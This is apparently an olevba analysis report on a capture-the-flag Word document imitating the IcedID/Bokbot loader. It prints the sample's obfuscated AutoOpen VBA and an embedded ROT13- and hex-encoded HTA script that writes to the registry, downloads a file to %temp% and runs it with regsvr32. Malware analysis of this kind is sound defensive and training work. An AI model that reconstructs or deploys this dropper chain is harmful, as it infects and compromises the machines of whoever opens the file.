@@ -1,0 +1,344 @@
+olevba 0.56.1 on Python 3.9.2 - http://decalage.info/python/oletools
+===============================================================================
+FILE: IceID_Bokbot_RITSEC.docm
+Type: OpenXML
+-------------------------------------------------------------------------------
+VBA MACRO ThisDocument.cls 
+in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+(empty macro)
+-------------------------------------------------------------------------------
+VBA MACRO NewMacros.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub AutoOpen()
+Function aRXKz()
+aRXKz = frm.txt.Text
+End Function
+Public Function aTwLcg(alRUYI)
+aTwLcg = Replace(alRUYI, a7sVN, "")
+End Function
+Sub AutoOpen()
+main
+End Sub
+Public Sub a8hv3(ai295)
+End Sub
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO Module1.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Public Const aHVWt As String = "p_:_\_j_v_a_q_b_j_f_\_f_l_f_g_r_z_3_2_\_z_f_u_g_n__r_k_r_"
+Public Const aqv6tf As String = "EVGFRP{E0GG1ATZ@YP0Q3}"
+
+Public Const a7sVN As String = "_"
+Public Const asXlUN As Integer = -954 + 967
+Public Function aENoBO(aHu95, avuEG8)
+FileNumber = FreeFile
+Open aHu95 For Output As #FileNumber
+Print #FileNumber, Spc(-413 + 456)
+Print #FileNumber, avuEG8
+Print #FileNumber, Spc(-413 + 456)
+Close #FileNumber
+End Function
+Sub aUoaN(adDgz, at09Aq)
+FileCopy adDgz, at09Aq
+End Sub
+Function anPr56(aCl8i)
+anPr56 = Len(aCl8i)
+End Function
+Function a79yA(aO0h5k)
+a79yA = aO0h5k + 12324 / 474
+End Function
+Function aHScDO(aoza8) As String
+Dim alc6yS As Long
+Dim a9uRX As Integer
+Dim agyvb As Integer
+For alc6yS = 1 To anPr56(aoza8)
+agyvb = 0
+aFxdHY = VBA.Mid$(aoza8, alc6yS, 1)
+a9uRX = Asc(aFxdHY)
+If (a9uRX > 64 And a9uRX < 91) Or (a9uRX > 96 And a9uRX < 123) Then
+agyvb = asXlUN
+a9uRX = a9uRX - agyvb
+If a9uRX < 97 And a9uRX > 83 Then
+a9uRX = a79yA(a9uRX)
+ElseIf a9uRX < 65 Then
+a9uRX = a79yA(a9uRX)
+End If
+End If
+Mid$(aoza8, alc6yS, 1) = VBA.Chr$(a9uRX)
+Next
+aHScDO = aoza8
+End Function
+-------------------------------------------------------------------------------
+VBA MACRO Module2.bas 
+in file: word/vbaProject.bin - OLE stream: 'VBA/Module2'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Sub main()
+auIPjp = aHScDO(aTwLcg(aHVWt))
+aZuadn = aHScDO(aTwLcg(aqv6tf))
+a9ANR = aHScDO(aTwLcg(aE0yGK))
+aUoaN auIPjp, aZuadn
+aENoBO a9ANR, aHScDO(aRXKz)
+Shell aZuadn & " " & a9ANR
+End Sub
+-------------------------------------------------------------------------------
+VBA MACRO UserForm1.frm 
+in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+Private Sub TextBox1_Change()
+
+End Sub
+-------------------------------------------------------------------------------
+VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+<!QBPGLCR ugzy><ugzy><urnq><gvgyr>nmJ6P</gvgyr></urnq><obql><c vq="pbagrag">76617234646s7520616n377841203q203434646s75363231373o0n76617234646s752061634p6o4q78203q207434646s757275653o34646s750n766134646s7572206138707n34646s7561203q2066616p73653o34646s750n66756r6334646s7574696s34646s756r2061753241362834646s75616947396s4r292034646s757o0n0976617220615947547n203q34646s752027273o34646s750n09666s72202876617234646s7520613571756r43203q20303o20613571756r43203p2034646s75616947396s4r2r6p656r6734646s7574683o20613571756r34646s7543202o3q34646s75203229207o0n09096134646s755947547n202o3q2034646s75537472696r672r66726s6q34646s7543686172436s6434646s7565287061727365496r7428616947396s4r2r73756273747228613571756r34646s75432p20322934646s752p20313629293o0n097q0n09726534646s757475726r20615947547n3o0n7q34646s750n766172206134646s7554723777203q2066616p73653o0n614p514q6o203q202q34646s75353934646s753931333o0n6169355734646s7547203q202761477n4q4845273o34646s750n6152504o34646s7567203q2034646s7561693557472r6p656r6774683o0n615n516846203q2034646s75747275653o0n66756r6334646s7574696s6r2061614r34646s75394828615947547n29207o0n0934646s7572657475726r20615947547n2r73706p69742834646s752727292r7265766572736528292r6n6s696r282727293o0n7q0n7661722061346974656s203q202q34323638323o34646s750n7661722061396p6934646s757547203q202761586p6q7450273o0n766172206139466r5142203q34646s752061396p6975472r746s537472696r6728293o0n76617220613638615n30203q2027615334646s754n4o4r63273o0n7661722034646s756159586s47203q206r6577204163746976655878784s626n65637428276q73786q6p322r786q6p6878787027293o0n76617220614s317534646s754930203q2027616s665164273o0n6147516s37203q20614s317534646s7549302r6p656r6774683o0n76617220616567686472203q2027616o34646s75706441273o0n613941496179203q206165676864722r746s537434646s7572696r6728293o0n766172206155426s6n65203q206r6577204163746976655834646s7578784s626n656374282761646s646261612r73747265616q27293o0n76617220616856726r203q2034353738353o34646s750n614471554q7n203q202q36313832383o34646s750n766172206173346469203q206r6577204163746934646s7576655878784s626n656374282777736372697074732r7368656p6p7327293o0n61336p635238203q2066616p73653o34646s750n76617220614q74306p203q202q31383031353o34646s750n61687259344r203q20747275653o34646s750n614o6s364978203q20276148546766273o34646s750n614r47556p46203q20614o6s3649782r746s53747234646s75696r6728293o0n613355695861203q2061733464692r657870616r64656r766934646s75726s6s6s6r6q656r74737472696r677328272574656q702527293o0n61506p3847203q202q32373035373o34646s750n76617220614q687637203q202761434967782734646s753o0n766172206137343339203q2066616p73653o34646s750n76617220616n6r3848203q20276142393034273o34646s750n766172206172653833203q20616n6r38482r6p656r67746834646s753o0n61346q3775203q2027616o445345273o34646s750n6151493047203q20747275653o34646s750n7661722061454p3246203q20276155586134646s75484s273o0n616o696r30203q2061454p32462r746s557070657234646s754361736528293o0n6149615032203q2032323133363o34646s750n6179595262203q20613355695861202o205334646s757472696r672r66726s6q43686172436s646528393229202o202774656q702r746q70273o0n614538394r36203q202q343932393o34646s750n76617220617153595843203q2066616p73653o34646s750n6167784q6677203q2027616q7n5573273o34646s750n766172206142747079203q206167784q66772r746s34646s75537472696r6728293o0n75203q2061614r39482875293o34646s750n75203q2061753241362875293o34646s750n76617220616p32717430203q2034363631373o0n6156596277203q2027613963777n273o0n616o53337268203q2061565962772r746s55707065724361736528293o0n61586r4o4n203q202q36323838303o69670n76617220617178774641203q2027615n70634674273o0n617071576o203q206171787746412r6967746s4p6s7765724361736528293o0n766172206173775436203q20747275653o69670n766172206130656n6958203q2066616p73653o69670n6159586s472r6s70656r282747455473272p20752p69672030293o0n6176516s5n203q2066616p73653o69670n616o4564794r203q2033313939363o69670n61715n6562203q20276179585n4671273o69670n766172206166516174203q2061715n65622r7469676s55707065724361736528293o0n76617220614p6o4156203q202q35303235393o69670n6159586s472r73656r6428293o69670n7661722061617n3543203q20276156696774316271273o0n766172206159517970203q2061617n354369672r746s4p6s7765724361736528293o0n6175674952203q2027616n644r56273o69670n6142346p5731203q2061756749522r746s5369677472696r6728293o0n696620286159586s472r737461747573203q3q206967323030202626206159586s472r72656164797374617465203q3q203429207o0n0961696q4956203q2035343332303o69670n0976617220613761574n203q202q3532376967373o0n096155426s6n652r6s70656r28293o69670n09766172206170634n62203q202761554369677772273o0n096165747738203q206170634n622r6p656r67696774683o0n096155426s6n652r74797065203q20313o69670n0976617220615176793745203q20747275653o69670n09766172206132555467203q2027614o4r4p69442769673o0n09766172206142367n6r203q2061325554672r746s557069677065724361736528293o0n096132496431203q202q36353132373o69670n096155426s6n652r7772697465286159586s6967472r726573706s6r7365626s6479293o0n096137786935203q2027616q757836273o69670n09615834593879203q2034373739373o69670n097661722061414q4s65203q20353631353369673o0n096155426s6n652r73617665746s66696p6528616967795952622p2032293o0n096161425451203q20747275653o69670n0961756762337n203q20276155455n526967273o0n0961426r456851203q2061756762337n2r7469676s537472696r6728293o0n096155426s6n652r636p6s736528293o69670n7q69670n61336n69674n7661203q202761674q4n70273o0n766172206169675367735172203q20747275653o0n6165783730203q696720353434353o0n766172206135704o306967203q20747275653o0n617n4q446479203q20276169676775447n73273o0n76617220616n46674q75203q206967747275653o0n6168437053203q20747275653o69670n61733464692r72756r2827726567736967767233332027202o206179595262293o0n766172206150444r56203q20333437353569673o0n76617220614r30414s38203q202q363533373969673o0n76617220616q6s5439203q20747275653o69670n766172206133427n5638203q20276151637n716967273o0n7661722061724s366r76203q206133427n56382r6p6967656r6774683o0n61774q5530203q2032303433313o6967</c><fpevcg ynathntr="wninfpevcg">ine nBNd9H = snyfr;nEjFIB = "nx067";nfumZy = nEjFIB.gbHccrePnfr();ine nBTa0O = snyfr;shapgvba nqzAeS(neT63A){ine nuiE43 = "";sbe(ine nskYeM = 0; nskYeM < neT63A.yratgu; nskYeM += 2){nuiE43 += Fgevat.sebzPunePbqr(cnefrVag(neT63A.fhofge(nskYeM, 2), 16));}erghea(nuiE43);}ine nVXFZz = "nApuC";ine nf95nq = nVXFZz.gbYbjrePnfr();ine nkA8pP = -17172;ine nJchnF = snyfr;ine ngP6E = "UXRLF_PHEERAG_HFRE\\Fbsgjner\\zlfbsgjner1\\xrl1";ine n2HhMm = "nHeUC";ine nD1dY = n2HhMm.gbFgevat();no5at = -8963;jvaqbj.erfvmrGb(1, 1);nAVnu = "nANwoj";nkHrfw = nAVnu.yratgu;nxN3O = snyfr;ine nmuzr = 17368;nwz1Ub = "nLEdWg";jvaqbj.zbirGb(-101, -101);ine nCeSWy = "nvV4Dx";ine nN5Wg = nCeSWy.gbFgevat();ine nf9ZK = -59815;ine nTpHf = arj NpgvirKkkBowrpg("jfpevcgf.furyyf");ine nb4jr = 45002;ine nuvyE = qbphzrag.trgfRyrzragOlVq("pbagrag");nJIMy = "nz95L";nfopIE = "nTdgb3";nBHn2 = nfopIE.gbYbjrePnfr();nub9Vp = gehr;nmEGQ = -4909;ine nUY920 = "nzYdIg";ine nbBYmX = nUY920.gbFgevat();ine n3HwE7 = gehr;nJWNF9 = -47104;ine ndzAfh = -22252;ine nrB0of = "nFPeUB";ine n0Q1tJ = "nOpego";ine nE6ywv = n0Q1tJ.gbHccrePnfr();nTpHf.ErtJJevgr(ngP6E, nuvyE.vaareUGZY, "ERT_FMf");</fpevcg><fpevcg ynathntr="iofpevcg">n41Kze = nTpHf.ErtEErnq(ngP6E)nTpHf.ErtQQryrgr(ngP6E)</fpevcg><fpevcg ynathntr="wninfpevcg">nElsZ = gehr;nqT8D = -32006;ine nSAj6P = 64467;n41Kze = nqzAeS(n41Kze);ine nwIYcG = -24785;ngF5TK = "naGL4";nrhaL = ngF5TK.gbFgevat();n41Kze = n41Kze.ercynpr(/4qbh/vt, "");ine nUaxs = snyfr;ine nzN1B = 51320;ine nYjPa5 = arj Shapgvba("h", "p", n41Kze);ine nIlfr = -50758;ine nSbj5I = -13992;na2zL = 52218;nYjPa5("261636r23757s6963696p616q6s2472756078756r2q7r603124704365357662603o7345435459425s2s2n307878786", 0);n7omT = "nZFGzL";nhGSq = n7omT.gbFgevat();nrTbH = -1926;ine nRKVjT = "nAsDe";nbWOHI = nRKVjT.yratgu;jvaqbj.pybfr();</fpevcg></obql></ugzy>,
+-------------------------------------------------------------------------------
+VBA FORM Variable "b'TextBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
+b'<!QBPGLCR ugzy><ugzy><urnq><gvgyr>nmJ6P</gvgyr></urnq><obql><c vq="pbagrag">76617234646s7520616n377841203q203434646s75363231373o0n76617234646s752061634p6o4q78203q207434646s757275653o34646s750n766134646s7572206138707n34646s7561203q2066616p73653o34646s750n66756r6334646s7574696s34646s756r2061753241362834646s75616947396s4r292034646s757o0n0976617220615947547n203q34646s752027273o34646s750n09666s72202876617234646s7520613571756r43203q20303o20613571756r43203p2034646s75616947396s4r2r6p656r6734646s7574683o20613571756r34646s7543202o3q34646s75203229207o0n09096134646s755947547n202o3q2034646s75537472696r672r66726s6q34646s7543686172436s6434646s7565287061727365496r7428616947396s4r2r73756273747228613571756r34646s75432p20322934646s752p20313629293o0n097q0n09726534646s757475726r20615947547n3o0n7q34646s750n766172206134646s7554723777203q2066616p73653o0n614p514q6o203q202q34646s75353934646s753931333o0n6169355734646s7547203q202761477n4q4845273o34646s750n6152504o34646s7567203q2034646s7561693557472r6p656r6774683o0n615n516846203q2034646s75747275653o0n66756r6334646s7574696s6r2061614r34646s75394828615947547n29207o0n0934646s7572657475726r20615947547n2r73706p69742834646s752727292r7265766572736528292r6n6s696r282727293o0n7q0n7661722061346974656s203q202q34323638323o34646s750n7661722061396p6934646s757547203q202761586p6q7450273o0n766172206139466r5142203q34646s752061396p6975472r746s537472696r6728293o0n76617220613638615n30203q2027615334646s754n4o4r63273o0n7661722034646s756159586s47203q206r6577204163746976655878784s626n65637428276q73786q6p322r786q6p6878787027293o0n76617220614s317534646s754930203q2027616s665164273o0n6147516s37203q20614s317534646s7549302r6p656r6774683o0n76617220616567686472203q2027616o34646s75706441273o0n613941496179203q206165676864722r746s537434646s7572696r6728293o0n766172206155426s6n65203q206r6577204163746976655834646s7578784s626n656374282761646s646261612r73747265616q27293o0n76617220616856726r203q2034353738353o34646s750n614471554q7n203q202q36313832383o34646s750n766172206173346469203q206r6577204163746934646s7576655878784s626n656374282777736372697074732r7368656p6p7327293o0n61336p635238203q2066616p73653o34646s750n76617220614q74306p203q202q31383031353o34646s750n61687259344r203q20747275653o34646s750n614o6s364978203q20276148546766273o34646s750n614r47556p46203q20614o6s3649782r746s53747234646s75696r6728293o0n613355695861203q2061733464692r657870616r64656r766934646s75726s6s6s6r6q656r74737472696r677328272574656q702527293o0n61506p3847203q202q32373035373o34646s750n76617220614q687637203q202761434967782734646s753o0n766172206137343339203q2066616p73653o34646s750n76617220616n6r3848203q20276142393034273o34646s750n766172206172653833203q20616n6r38482r6p656r67746834646s753o0n61346q3775203q2027616o445345273o34646s750n6151493047203q20747275653o34646s750n7661722061454p3246203q20276155586134646s75484s273o0n616o696r30203q2061454p32462r746s557070657234646s754361736528293o0n6149615032203q2032323133363o34646s750n6179595262203q20613355695861202o205334646s757472696r672r66726s6q43686172436s646528393229202o202774656q702r746q70273o0n614538394r36203q202q343932393o34646s750n76617220617153595843203q2066616p73653o34646s750n6167784q6677203q2027616q7n5573273o34646s750n766172206142747079203q206167784q66772r746s34646s75537472696r6728293o0n75203q2061614r39482875293o34646s750n75203q2061753241362875293o34646s750n76617220616p32717430203q2034363631373o0n6156596277203q2027613963777n273o0n616o53337268203q2061565962772r746s55707065724361736528293o0n61586r4o4n203q202q36323838303o69670n76617220617178774641203q2027615n70634674273o0n617071576o203q206171787746412r6967746s4p6s7765724361736528293o0n766172206173775436203q20747275653o69670n766172206130656n6958203q2066616p73653o69670n6159586s472r6s70656r282747455473272p20752p69672030293o0n6176516s5n203q2066616p73653o69670n616o4564794r203q2033313939363o69670n61715n6562203q20276179585n4671273o69670n766172206166516174203q2061715n65622r7469676s55707065724361736528293o0n76617220614p6o4156203q202q35303235393o69670n6159586s472r73656r6428293o69670n7661722061617n3543203q20276156696774316271273o0n766172206159517970203q2061617n354369672r746s4p6s7765724361736528293o0n6175674952203q2027616n644r56273o69670n6142346p5731203q2061756749522r746s5369677472696r6728293o0n696620286159586s472r737461747573203q3q206967323030202626206159586s472r72656164797374617465203q3q203429207o0n0961696q4956203q2035343332303o69670n0976617220613761574n203q202q3532376967373o0n096155426s6n652r6s70656r28293o69670n09766172206170634n62203q202761554369677772273o0n096165747738203q206170634n622r6p656r67696774683o0n096155426s6n652r74797065203q20313o69670n0976617220615176793745203q20747275653o69670n09766172206132555467203q2027614o4r4p69442769673o0n09766172206142367n6r203q2061325554672r746s557069677065724361736528293o0n096132496431203q202q36353132373o69670n096155426s6n652r7772697465286159586s6967472r726573706s6r7365626s6479293o0n096137786935203q2027616q757836273o69670n09615834593879203q2034373739373o69670n097661722061414q4s65203q20353631353369673o0n096155426s6n652r73617665746s66696p6528616967795952622p2032293o0n096161425451203q20747275653o69670n0961756762337n203q20276155455n526967273o0n0961426r456851203q2061756762337n2r7469676s537472696r6728293o0n096155426s6n652r636p6s736528293o69670n7q69670n61336n69674n7661203q202761674q4n70273o0n766172206169675367735172203q20747275653o0n6165783730203q696720353434353o0n766172206135704o306967203q20747275653o0n617n4q446479203q20276169676775447n73273o0n76617220616n46674q75203q206967747275653o0n6168437053203q20747275653o69670n61733464692r72756r2827726567736967767233332027202o206179595262293o0n766172206150444r56203q20333437353569673o0n76617220614r30414s38203q202q363533373969673o0n76617220616q6s5439203q20747275653o69670n766172206133427n5638203q20276151637n716967273o0n7661722061724s366r76203q206133427n56382r6p6967656r6774683o0n61774q5530203q2032303433313o6967</c><fpevcg ynathntr="wninfpevcg">ine nBNd9H = snyfr;nEjFIB = "nx067";nfumZy = nEjFIB.gbHccrePnfr();ine nBTa0O = snyfr;shapgvba nqzAeS(neT63A){ine nuiE43 = "";sbe(ine nskYeM = 0; nskYeM < neT63A.yratgu; nskYeM += 2){nuiE43 += Fgevat.sebzPunePbqr(cnefrVag(neT63A.fhofge(nskYeM, 2), 16));}erghea(nuiE43);}ine nVXFZz = "nApuC";ine nf95nq = nVXFZz.gbYbjrePnfr();ine nkA8pP = -17172;ine nJchnF = snyfr;ine ngP6E = "UXRLF_PHEERAG_HFRE\\\\Fbsgjner\\\\zlfbsgjner1\\\\xrl1";ine n2HhMm = "nHeUC";ine nD1dY = n2HhMm.gbFgevat();no5at = -8963;jvaqbj.erfvmrGb(1, 1);nAVnu = "nANwoj";nkHrfw = nAVnu.yratgu;nxN3O = snyfr;ine nmuzr = 17368;nwz1Ub = "nLEdWg";jvaqbj.zbirGb(-101, -101);ine nCeSWy = "nvV4Dx";ine nN5Wg = nCeSWy.gbFgevat();ine nf9ZK = -59815;ine nTpHf = arj NpgvirKkkBowrpg("jfpevcgf.furyyf");ine nb4jr = 45002;ine nuvyE = qbphzrag.trgfRyrzragOlVq("pbagrag");nJIMy = "nz95L";nfopIE = "nTdgb3";nBHn2 = nfopIE.gbYbjrePnfr();nub9Vp = gehr;nmEGQ = -4909;ine nUY920 = "nzYdIg";ine nbBYmX = nUY920.gbFgevat();ine n3HwE7 = gehr;nJWNF9 = -47104;ine ndzAfh = -22252;ine nrB0of = "nFPeUB";ine n0Q1tJ = "nOpego";ine nE6ywv = n0Q1tJ.gbHccrePnfr();nTpHf.ErtJJevgr(ngP6E, nuvyE.vaareUGZY, "ERT_FMf");</fpevcg><fpevcg ynathntr="iofpevcg">n41Kze = nTpHf.ErtEErnq(ngP6E)nTpHf.ErtQQryrgr(ngP6E)</fpevcg><fpevcg ynathntr="wninfpevcg">nElsZ = gehr;nqT8D = -32006;ine nSAj6P = 64467;n41Kze = nqzAeS(n41Kze);ine nwIYcG = -24785;ngF5TK = "naGL4";nrhaL = ngF5TK.gbFgevat();n41Kze = n41Kze.ercynpr(/4qbh/vt, "");ine nUaxs = snyfr;ine nzN1B = 51320;ine nYjPa5 = arj Shapgvba("h", "p", n41Kze);ine nIlfr = -50758;ine nSbj5I = -13992;na2zL = 52218;nYjPa5("261636r23757s6963696p616q6s2472756078756r2q7r603124704365357662603o7345435459425s2s2n307878786", 0);n7omT = "nZFGzL";nhGSq = n7omT.gbFgevat();nrTbH = -1926;ine nRKVjT = "nAsDe";nbWOHI = nRKVjT.yratgu;jvaqbj.pybfr();</fpevcg></obql></ugzy>'
++----------+--------------------+---------------------------------------------+
+|Type      |Keyword             |Description                                  |
++----------+--------------------+---------------------------------------------+
+|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
+|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
+|          |                    |objects trigger events                       |
+|Suspicious|Open                |May open a file                              |
+|Suspicious|Output              |May write to a file (if combined with Open)  |
+|Suspicious|Print #             |May write to a file (if combined with Open)  |
+|Suspicious|FileCopy            |May copy a file                              |
+|Suspicious|Shell               |May run an executable file or a system       |
+|          |                    |command                                      |
+|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
+|          |                    |(use option --deobf to deobfuscate)          |
+|Suspicious|write               |May write to a file (if combined with Open)  |
+|          |                    |(obfuscation: Hex)                           |
+|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
+|          |                    |used to obfuscate strings (option --decode to|
+|          |                    |see all)                                     |
+|Hex String|!'[                 |0C21275B                                     |
+|Hex String|var4d               |7661723464                                   |
+|Hex String|7xA                 |37784120                                     |
+|Hex String| 44d                |20343464                                     |
+|Hex String|u6217               |7536323137                                   |
+|Hex String|u ac                |75206163                                     |
+|Hex String| t4d                |20743464                                     |
+|Hex String|urue                |75727565                                     |
+|Hex String|va4d                |76613464                                     |
+|Hex String|ur a8p              |757220613870                                 |
+|Hex String| au2A6(4d           |206175324136283464                           |
+|Hex String|uaiG9               |7561694739                                   |
+|Hex String|) 4d                |29203464                                     |
+|Hex String|        var aYGT    |097661722061594754                           |
+|Hex String|u ''                |75202727                                     |
+|Hex String|r (var4d            |7220287661723464                             |
+|Hex String|u a5qu              |752061357175                                 |
+|Hex String| a5qu               |2061357175                                   |
+|Hex String|u 2)                |7520322920                                   |
+|Hex String|                a4d |0909613464                                   |
+|Hex String|uYGT                |75594754                                     |
+|Hex String|uStri               |7553747269                                   |
+|Hex String|uCharC              |754368617243                                 |
+|Hex String|ue(parseI           |756528706172736549                           |
+|Hex String|t(aiG9              |742861694739                                 |
+|Hex String|substr(a5qu         |7375627374722861357175                       |
+|Hex String| 2)4d               |2032293464                                   |
+|Hex String| 16))               |2031362929                                   |
+|Hex String|        re4d        |0972653464                                   |
+|Hex String|utur                |75747572                                     |
+|Hex String| aYGT               |2061594754                                   |
+|Hex String|var a4d             |76617220613464                               |
+|Hex String|uTr7w               |755472377720                                 |
+|Hex String|u594d               |7535393464                                   |
+|Hex String|u913                |75393133                                     |
+|Hex String|ai5W4d              |616935573464                                 |
+|Hex String| 'aG                |20276147                                     |
+|Hex String|uai5WG              |756169355747                                 |
+|Hex String|QhF                 |51684620                                     |
+|Hex String|utrue               |7574727565                                   |
+|Hex String|u9H(aYGT            |7539482861594754                             |
+|Hex String|uretur              |757265747572                                 |
+|Hex String|it(4d               |6974283464                                   |
+|Hex String|u'')                |75272729                                     |
+|Hex String|reverse()           |726576657273652829                           |
+|Hex String|('')                |28272729                                     |
+|Hex String|var a4ite           |766172206134697465                           |
+|Hex String|42682               |3432363832                                   |
+|Hex String|var a9              |766172206139                                 |
+|Hex String|uuG                 |75754720                                     |
+|Hex String| 'aX                |20276158                                     |
+|Hex String|var a9F             |76617220613946                               |
+|Hex String|u a9                |75206139                                     |
+|Hex String|Stri                |53747269                                     |
+|Hex String|var a68a            |7661722061363861                             |
+|Hex String| 'aS4d              |202761533464                                 |
+|Hex String|var 4d              |766172203464                                 |
+|Hex String|uaYX                |75615958                                     |
+|Hex String|ew ActiveXxx        |657720416374697665587878                     |
+|Hex String|ect('               |6563742827                                   |
+|Hex String|hxxp')              |687878702729                                 |
+|Hex String|var a               |7661722061                                   |
+|Hex String|1u4d                |31753464                                     |
+|Hex String|uI0                 |75493020                                     |
+|Hex String|fQd'                |66516427                                     |
+|Hex String|var aeghdr          |7661722061656768647220                       |
+|Hex String|updA'               |7570644127                                   |
+|Hex String|a9AIay              |61394149617920                               |
+|Hex String| aeghdr             |20616567686472                               |
+|Hex String|St4d                |53743464                                     |
+|Hex String|var aUB             |76617220615542                               |
+|Hex String|ew ActiveX4d        |657720416374697665583464                     |
+|Hex String|ect('ad             |65637428276164                               |
+|Hex String|dbaa                |64626161                                     |
+|Hex String|strea               |7374726561                                   |
+|Hex String|var ahVr            |7661722061685672                             |
+|Hex String| 45785              |203435373835                                 |
+|Hex String|aDqU                |61447155                                     |
+|Hex String|61828               |3631383238                                   |
+|Hex String|var as4di           |76617220617334646920                         |
+|Hex String|ew Acti4d           |657720416374693464                           |
+|Hex String|uveXxx              |757665587878                                 |
+|Hex String|ect('wscripts       |65637428277773637269707473                   |
+|Hex String|cR8                 |63523820                                     |
+|Hex String|18015               |3138303135                                   |
+|Hex String|ahrY4               |6168725934                                   |
+|Hex String| true               |2074727565                                   |
+|Hex String|6Ix                 |36497820                                     |
+|Hex String| 'aHTgf'            |2027614854676627                             |
+|Hex String|Str4d               |5374723464                                   |
+|Hex String|a3UiXa              |61335569586120                               |
+|Hex String| as4di              |206173346469                                 |
+|Hex String|expa                |65787061                                     |
+|Hex String|vi4d                |76693464                                     |
+|Hex String|tstri               |7473747269                                   |
+|Hex String|gs('%te             |67732827257465                               |
+|Hex String|p%')                |70252729                                     |
+|Hex String|27057               |3237303537                                   |
+|Hex String|hv7                 |68763720                                     |
+|Hex String| 'aCIgx'4d          |20276143496778273464                         |
+|Hex String|var a7439           |76617220613734333920                         |
+|Hex String| 'aB904'            |2027614239303427                             |
+|Hex String|var are83           |76617220617265383320                         |
+|Hex String|gth4d               |6774683464                                   |
+|Hex String|DSE'                |44534527                                     |
+|Hex String|aQI0G               |615149304720                                 |
+|Hex String|var aE              |766172206145                                 |
+|Hex String| 'aUXa4d            |2027615558613464                             |
+|Hex String|Upper4d             |55707065723464                               |
+|Hex String|uCase()             |75436173652829                               |
+|Hex String|aIaP2               |614961503220                                 |
+|Hex String| 22136              |203232313336                                 |
+|Hex String|ayYRb               |617959526220                                 |
+|Hex String| a3UiXa             |2061335569586120                             |
+|Hex String| S4d                |20533464                                     |
+|Hex String|utri                |75747269                                     |
+|Hex String|CharC               |4368617243                                   |
+|Hex String|de(92)              |64652839322920                               |
+|Hex String| 'te                |20277465                                     |
+|Hex String|aE89                |61453839                                     |
+|Hex String|4929                |34393239                                     |
+|Hex String|var aqSYXC          |7661722061715359584320                       |
+|Hex String|var aBtpy           |76617220614274707920                         |
+|Hex String| agx                |20616778                                     |
+|Hex String|9H(u)               |3948287529                                   |
+|Hex String| au2A6(u)           |206175324136287529                           |
+|Hex String|2qt0                |3271743020                                   |
+|Hex String| 46617              |203436363137                                 |
+|Hex String|aVYbw               |615659627720                                 |
+|Hex String| 'a9cw              |202761396377                                 |
+|Hex String|S3rh                |5333726820                                   |
+|Hex String| aVYbw              |206156596277                                 |
+|Hex String|UpperCase()         |5570706572436173652829                       |
+|Hex String|62880               |3632383830                                   |
+|Hex String|var aqxwFA          |7661722061717877464120                       |
+|Hex String|pcFt'               |7063467427                                   |
+|Hex String|apqW                |61707157                                     |
+|Hex String| aqxwFA             |20617178774641                               |
+|Hex String|werCase()           |776572436173652829                           |
+|Hex String|var aswT6           |76617220617377543620                         |
+|Hex String|var a0e             |76617220613065                               |
+|Hex String|('GETs'             |28274745547327                               |
+|Hex String|ig 0)               |6967203029                                   |
+|Hex String| 31996              |203331393936                                 |
+|Hex String| 'ayX               |2027617958                                   |
+|Hex String|var afQat           |76617220616651617420                         |
+|Hex String|50259               |3530323539                                   |
+|Hex String|var aa              |766172206161                                 |
+|Hex String| 'aVigt1bq'         |2027615669677431627127                       |
+|Hex String|var aYQyp           |76617220615951797020                         |
+|Hex String|5Cig                |35436967                                     |
+|Hex String|augIR               |617567495220                                 |
+|Hex String| augIR              |206175674952                                 |
+|Hex String|Sigtri              |536967747269                                 |
+|Hex String|if (aYX             |69662028615958                               |
+|Hex String|status              |73746174757320                               |
+|Hex String| ig200 && aYX       |20696732303020262620615958                   |
+|Hex String|readystate          |7265616479737461746520                       |
+|Hex String| 4)                 |20342920                                     |
+|Hex String| 54320              |203534333230                                 |
+|Hex String|        var a7aW    |097661722061376157                           |
+|Hex String|527ig7              |353237696737                                 |
+|Hex String|        aUB         |09615542                                     |
+|Hex String|        var apc     |0976617220617063                             |
+|Hex String| 'aUCigwr'          |20276155436967777227                         |
+|Hex String|        aetw8       |09616574773820                               |
+|Hex String| apc                |20617063                                     |
+|Hex String|gigth               |6769677468                                   |
+|Hex String|type                |7479706520                                   |
+|Hex String|        var aQvy7E  |097661722061517679374520                     |
+|Hex String|        var a2UTg   |0976617220613255546720                       |
+|Hex String|iD'ig               |6944276967                                   |
+|Hex String|        var aB6     |0976617220614236                             |
+|Hex String| a2UTg              |206132555467                                 |
+|Hex String|UpigperCase()       |55706967706572436173652829                   |
+|Hex String|        a2Id1       |09613249643120                               |
+|Hex String|65127               |3635313237                                   |
+|Hex String|write(aYX           |777269746528615958                           |
+|Hex String|resp                |72657370                                     |
+|Hex String|        a7xi5       |09613778693520                               |
+|Hex String|ux6'                |75783627                                     |
+|Hex String|        aX4Y8y      |0961583459387920                             |
+|Hex String| 47797              |203437373937                                 |
+|Hex String|        var aA      |09766172206141                               |
+|Hex String| 56153ig            |2035363135336967                             |
+|Hex String|savet               |7361766574                                   |
+|Hex String|e(aigyYRb           |652861696779595262                           |
+|Hex String|        aaBTQ       |09616142545120                               |
+|Hex String|        augb3       |096175676233                                 |
+|Hex String| 'aUE               |2027615545                                   |
+|Hex String|Rig'                |52696727                                     |
+|Hex String|EhQ                 |45685120                                     |
+|Hex String| augb3              |206175676233                                 |
+|Hex String|se()                |73652829                                     |
